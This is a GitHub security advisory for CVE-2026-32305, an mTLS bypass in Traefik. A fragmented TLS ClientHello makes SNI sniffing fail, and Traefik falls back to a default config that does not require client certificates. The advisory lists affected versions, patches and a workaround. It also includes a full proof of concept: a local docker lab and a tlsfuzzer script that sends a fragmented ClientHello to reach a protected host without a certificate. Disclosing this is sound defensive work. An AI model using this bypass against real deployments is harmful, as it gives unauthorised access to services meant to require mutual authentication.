# [H] Traefik has a Potential mTLS Bypass via Fragmented TLS ClientHello Causing Pre-SNI Sniff Fallback to Default Non-mTLS TLS Config

## Summary
Severity: High
Advisory: GHSA-wvvq-wgcr-9q48
CVE: CVE-2026-32305
CWE: CWE-287
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N (CVSS_V4)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-wvvq-wgcr-9q48
Type: github-advisory

## Affected
- Go: `github.com/traefik/traefik/v3` — affected >=3.7.0-ea.1 <3.7.0-ea.2
- Go: `github.com/traefik/traefik/v3` — affected >=0 <3.6.11
- Go: `github.com/traefik/traefik/v2` — affected >=0 <2.11.41
- Go: `github.com/traefik/traefik` — affected >=0

## Details
## Summary

There is a potential vulnerability in Traefik's TLS SNI pre-sniffing logic related to fragmented ClientHello packets.

When a TLS ClientHello is fragmented across multiple records, Traefik's SNI extraction may fail with an EOF and return an empty SNI. The TCP router then falls back to the default TLS configuration, which does not require client certificates by default. This allows an attacker to bypass route-level mTLS enforcement and access services that should require mutual TLS authentication.

## Patches

- https://github.com/traefik/traefik/releases/tag/v2.11.41
- https://github.com/traefik/traefik/releases/tag/v3.6.11
- https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2

## For more information

If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

### Summary
I found a behavior in Traefik's latest version where fragmented ClientHello packets can cause pre-sniff SNI extraction to not find the sni (EOF during sniff), which makes the TCP router fall back to default routing TLS config.

If the default TLS config does not require client certificates (which is NoClientCert by default), the handshake succeeds without client auth, and the request is later routed to the HTTP Host which should be the protected with client certificate authentication (RequireAndVerifyClientCert tls config).

### Details
The vulnerability is caused by a mismatch between where Traefik decides the TLS policy per host and where Go TLS can finally parse the full ClientHello.

1. In router.go, ServeTCP function calls clientHelloInfo.
2. clientHelloInfo peeks only one TLS record length (recLen) and then peeks exactly 5 + recLen bytes.
It runs a temporary TLS parse on those bytes to extract the SNI.
If ClientHello is fragmented, pre-sniff may return empty SNI (With fragmentation, first record can be incomplete for full ClientHello parsing).
4. clientHelloInfo still returns isTLS=true and empty SNI (it thinks there is no sni so it applies the default tls config (Which is by default NoClientCert which is permissive)
5. Real Go TLS handshake succeeds later without requiring the client cert.
6. Request is routed to the host that should have been protected.

Conditions required for impact:
- Route-level TLS options enforce mTLS for a host.
- Default TLS config is weaker (noClientCert, which is the default default).
- Pre-sniff fails to extract SNI (due to fragmented ClientHello).

A workaround for this is to set the default tls config to RequireAndVerifyClientCert (but then you need to explicitly define for each permissive host the NoClientCert TLS config).

A suggestion to fix is to parse the complete ClientHello before tls config decision (handle multi-record fragmentation).

### PoC
```python
# prerequisites (ubuntu/debian, in rhel/fedora you need to run only the install command (dnf) but with "docker" instead of docker.io and podman will emulate it)
sudo apt update
sudo apt install -y docker.io openssl git python3 python3-venv
sudo usermod -aG docker "$USER"
# in debian/ubuntu run newgrp docker to apply the new group to the user

mkdir -p /tmp/traefik-frag-poc/{certs,config/dynamic}
cd /tmp/traefik-frag-poc

# CA
openssl genrsa -out certs/ca.key 4096
openssl req -x509 -new -nodes -key certs/ca.key -sha256 -days 3650 \
  -subj "/CN=PoC-CA" -out certs/ca.crt

# Server cert (whoami.home.arpa)
cat > certs/server.cnf <<'EOF_SERVER_CNF'
[req]
distinguished_name = dn
req_extensions = v3_req
prompt = no

[dn]
CN = whoami.home.arpa

[v3_req]
subjectAltName = @alt_names

[alt_names]
DNS.1 = whoami.home.arpa
EOF_SERVER_CNF

openssl genrsa -out certs/traefik.key 2048
openssl req -new -key certs/traefik.key -out certs/traefik.csr -config certs/server.cnf
openssl x509 -req -in certs/traefik.csr -CA certs/ca.crt -CAkey certs/ca.key -CAcreateserial \
  -out certs/traefik.crt -days 365 -sha256 -extensions v3_req -extfile certs/server.cnf

# Client cert (valid client)
openssl genrsa -out certs/client.key 2048
openssl req -new -key certs/client.key -subj "/CN=client1" -out certs/client.csr
openssl x509 -req -in certs/client.csr -CA certs/ca.crt -CAkey certs/ca.key -CAcreateserial \
  -out certs/client.crt -days 365 -sha256

cat > config/traefik.yml <<'EOF_TRAEFIK_CFG'
entryPoints:
  websecure:
    address: ":8443"

providers:
  file:
    directory: /etc/traefik/dynamic
    watch: true

log:
  level: DEBUG
EOF_TRAEFIK_CFG

cat > config/dynamic/dynamic.yml <<'EOF_DYNAMIC_CFG'
http:
  routers:
    whoami:
      rule: "Host(`whoami.home.arpa`)"
      entryPoints:
        - websecure
      service: whoami
      tls:
        options: mtls

  services:
    whoami:
      loadBalancer:
        servers:
          - url: "http://whoami:80"

tls:
  certificates:
    - certFile: /certs/traefik.crt
      keyFile: /certs/traefik.key

  options:
    mtls:
      clientAuth:
        caFiles:
          - /certs/ca.crt
        clientAuthType: RequireAndVerifyClientCert
EOF_DYNAMIC_CFG

docker network create traefik-poc


# run a whoami microservice for the bypass demonstration
docker run -d \
  --name whoami \
  --network traefik-poc \
  --restart unless-stopped \
  traefik/whoami:v1.11.0

docker run -d \
  --name traefik \
  --network traefik-poc \
  -p 8443:8443 \
  --restart unless-stopped \
  -v "$PWD/config/traefik.yml:/etc/traefik/traefik.yml:ro,Z" \
  -v "$PWD/config/dynamic:/etc/traefik/dynamic:ro,Z" \
  -v "$PWD/certs:/certs:ro,Z" \
  traefik:3.6.10 \
  --configFile=/etc/traefik/traefik.yml

# watch traefik logs to ensure everything was deployed correctly
docker logs traefik

# tlsfuzzer setup + frag client script

mkdir -p /tmp/testtlsfuzz
cd /tmp/testtlsfuzz
git clone https://github.com/tlsfuzzer/tlsfuzzer.git
cd tlsfuzzer

python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt

cat > frag_clienthello.py <<'EOF_FRAG_SCRIPT'
import argparse
import sys
import os

from tlsfuzzer.runner import Runner
from tlsfuzzer.messages import (
    Connect,
    SetMaxRecordSize,
    ClientHelloGenerator,
    CertificateGenerator,
    CertificateVerifyGenerator,
    ClientKeyExchangeGenerator,
    ChangeCipherSpecGenerator,
    FinishedGenerator,
    ApplicationDataGenerator,
    AlertGenerator,
)
from tlsfuzzer.expect import (
    ExpectServerHello,
    ExpectCertificate,
    ExpectServerKeyExchange,
    ExpectCertificateRequest,
    ExpectServerHelloDone,
    ExpectChangeCipherSpec,
    ExpectFinished,
    ExpectApplicationData,
    ExpectAlert,
    ExpectClose,
)
from tlsfuzzer.helpers import SIG_ALL
from tlslite.constants import (
    CipherSuite,
    ExtensionType,
    AlertLevel,
    AlertDescription,
    GroupName,
)
from tlslite.extensions import (
    SNIExtension,
    TLSExtension,
    SupportedGroupsExtension,
    SignatureAlgorithmsExtension,
    SignatureAlgorithmsCertExtension,
)
from tlslite.utils.keyfactory import parsePEMKey
from tlslite.x509 import X509
from tlslite.x509certchain import X509CertChain


class PrettyExpectApplicationData(ExpectApplicationData):
    def process(self, state, msg):
        super().process(state, msg)
        text = msg.write().decode("utf-8", errors="replace")
        head, _, body = text.partition("\r\n\r\n")
        print("\n=== HTTP RESPONSE ===")
        print(head)
        print()
        print(body)
        print("=== END HTTP RESPONSE ===\n")


def load_client_cert_and_key(cert_path, key_path):
    cert = None
    key = None

    if cert_path:
        text_cert = open(cert_path, "rb").read()
        if sys.version_info[0] >= 3:
            text_cert = str(text_cert, "utf-8")
        cert = X509()
        cert.parse(text_cert)

    if key_path:
        text_key = open(key_path, "rb").read()
        if sys.version_info[0] >= 3:
            text_key = str(text_key, "utf-8")
        key = parsePEMKey(text_key, private=True)

    return cert, key


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--connect-host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=8443)
    p.add_argument("--sni", default="whoami.home.arpa")
    p.add_argument("--record-size", type=int, default=512)
    p.add_argument("--padding-len", type=int, default=1200)
    p.add_argument("--expect-cert-request", action="store_true")
    p.add_argument("--client-cert-pem", default="")
    p.add_argument("--client-key-pem", default="")
    args = p.parse_args()

    cert, key = load_client_cert_and_key(args.client_cert_pem, args.client_key_pem)

    print(f"[DBG] cert_arg={args.client_cert_pem!r} key_arg={args.client_key_pem!r}")
    for p in [args.client_cert_pem, args.client_key_pem]:
        if p:
            print(f"[DBG] file={p} exists={os.path.exists(p)} size={os.path.getsize(p) if os.path.exists(p) else -1}")

    print(f"[DBG] cert_loaded={cert is not None} key_loaded={key is not None}")
    print(f"[DBG] bool(cert)={bool(cert) if cert is not None else None} bool(key)={bool(key) if key is not None else None}")


    if (args.client_cert_pem or args.client_key_pem) and not (cert and key):
        raise ValueError("Provide both --client-cert-pem and --client-key-pem")

    conv = Connect(args.connect_host, args.port)
    node = conv
    node = node.add_child(SetMaxRecordSize(args.record_size))

    ext = {
        ExtensionType.server_name: SNIExtension().create(bytearray(args.sni, "ascii")),
        ExtensionType.supported_groups: SupportedGroupsExtension().create(
            [GroupName.secp256r1, GroupName.ffdhe2048]
        ),
        ExtensionType.signature_algorithms: SignatureAlgorithmsExtension().create(SIG_ALL),
        ExtensionType.signature_algorithms_cert: SignatureAlgorithmsCertExtension().create(SIG_ALL),
        21: TLSExtension().create(21, bytearray(args.padding_len)),
    }

    ciphers = [
        CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
        CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
        CipherSuite.TLS_DHE_RSA_WITH_AES_128_CBC_SHA,
        CipherSuite.TLS_EMPTY_RENEGOTIATION_INFO_SCSV,
    ]

    node = node.add_child(ClientHelloGenerator(ciphers, extensions=ext))
    node = node.add_child(ExpectServerHello())
    node = node.add_child(ExpectCertificate())
    node = node.add_child(ExpectServerKeyExchange())

    if args.expect_cert_request:
        node = node.add_child(ExpectCertificateRequest())

    node = node.add_child(ExpectServerHelloDone())

    if args.expect_cert_request and cert and key:
        node = node.add_child(CertificateGenerator(X509CertChain([cert])))
        node = node.add_child(ClientKeyExchangeGenerator())
        node = node.add_child(CertificateVerifyGenerator(key))
        node = node.add_child(ChangeCipherSpecGenerator())
        node = node.add_child(FinishedGenerator())
        node = node.add_child(ExpectChangeCipherSpec())
        node = node.add_child(ExpectFinished())
        req = bytearray(
            f"GET / HTTP/1.1\r\nHost: {args.sni}\r\nConnection: close\r\n\r\n".encode("ascii")
        )
        node = node.add_child(ApplicationDataGenerator(req))
        node = node.add_child(PrettyExpectApplicationData(output=sys.stdout))
        node = node.add_child(AlertGenerator(AlertLevel.warning, AlertDescription.close_notify))
        node = node.add_child(ExpectAlert())
        node.next_sibling = ExpectClose()

    elif args.expect_cert_request and not (cert and key):
        node = node.add_child(CertificateGenerator())
        node = node.add_child(ClientKeyExchangeGenerator())
        node = node.add_child(ChangeCipherSpecGenerator())
        node = node.add_child(FinishedGenerator())
        node = node.add_child(ExpectChangeCipherSpec())
        node = node.add_child(ExpectFinished())

    else:
        node = node.add_child(ClientKeyExchangeGenerator())
        node = node.add_child(ChangeCipherSpecGenerator())
        node = node.add_child(FinishedGenerator())
        node = node.add_child(ExpectChangeCipherSpec())
        node = node.add_child(ExpectFinished())
        req = bytearray(
            f"GET / HTTP/1.1\r\nHost: {args.sni}\r\nConnection: close\r\n\r\n".encode("ascii")
        )
        node = node.add_child(ApplicationDataGenerator(req))
        node = node.add_child(PrettyExpectApplicationData(output=sys.stdout))
        node = node.add_child(AlertGenerator(AlertLevel.warning, AlertDescription.close_notify))
        node = node.add_child(ExpectAlert())
        node.next_sibling = ExpectClose()

    try:
        Runner(conv).run()
        print("[OK] conversation completed")
    except AssertionError as e:
        print(f"[TLS RAW ERROR] {e}")
        marker = "Unexpected message from peer: "
        s = str(e)
        if marker in s:
            print(f"[TLS PEER MESSAGE] {s.split(marker, 1)[1].strip()}")
        raise


if __name__ == "__main__":
    main()
EOF_FRAG_SCRIPT

chmod +x frag_clienthello.py
cd /tmp/testtlsfuzz/tlsfuzzer
source .venv/bin/activate

# case 1: non fragmented, no client cert (strict mTLS path, should fail. traefik logs should inform that client didn't provide a certificate)
python frag_clienthello.py \
  --connect-host 127.0.0.1 \
  --port 8443 \
  --sni whoami.home.arpa \
  --record-size 16384 \
  --expect-cert-request

# case 1b with openssl instead of my script
printf 'GET / HTTP/1.1\r\nHost: whoami.home.arpa\r\nConnection: close\r\n\r\n' | \
openssl s_client \
  -connect 127.0.0.1:8443 \
  -servername whoami.home.arpa \
  -tls1_2 \
  -CAfile /tmp/traefik-frag-poc/certs/ca.crt \
  -state -msg -tlsextdebug -verify_return_error


# case 2: non fragmented, with valid client cert (should succeed) 
python frag_clienthello.py \
  --connect-host 127.0.0.1 \
  --port 8443 \
  --sni whoami.home.arpa \
  --record-size 16384 \
  --expect-cert-request \
  --client-cert-pem /tmp/traefik-frag-poc/certs/client.crt \
  --client-key-pem /tmp/traefik-frag-poc/certs/client.key

# case 2b with openssl instead of my script
printf 'GET / HTTP/1.1\r\nHost: whoami.home.arpa\r\nConnection: close\r\n\r\n' | \
openssl s_client -connect 127.0.0.1:8443 -servername whoami.home.arpa -tls1_2 \
  -cert /tmp/traefik-frag-poc/certs/client.crt \
  -key /tmp/traefik-frag-poc/certs/client.key \
  -CAfile /tmp/traefik-frag-poc/certs/ca.crt -quiet

# case 3 fragmented ClientHello, no client cert (bypass behavior test)
python frag_clienthello.py \
  --connect-host 127.0.0.1 \
  --port 8443 \
  --sni whoami.home.arpa \
  --record-size 500
# in the record-size you can play with it as long as the client hello sni sniff function returns an EOF
```

### Impact
An attacker can bypass route-level mTLS enforcement by fragmenting ClientHello so Traefik pre-sniff fails (EOF) and falls back to default permissive TLS config.

</details>

--

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-wvvq-wgcr-9q48
- https://nvd.nist.gov/vuln/detail/CVE-2026-32305
- https://github.com/traefik/traefik
- https://github.com/traefik/traefik/releases/tag/v2.11.41
- https://github.com/traefik/traefik/releases/tag/v3.6.11
- https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2
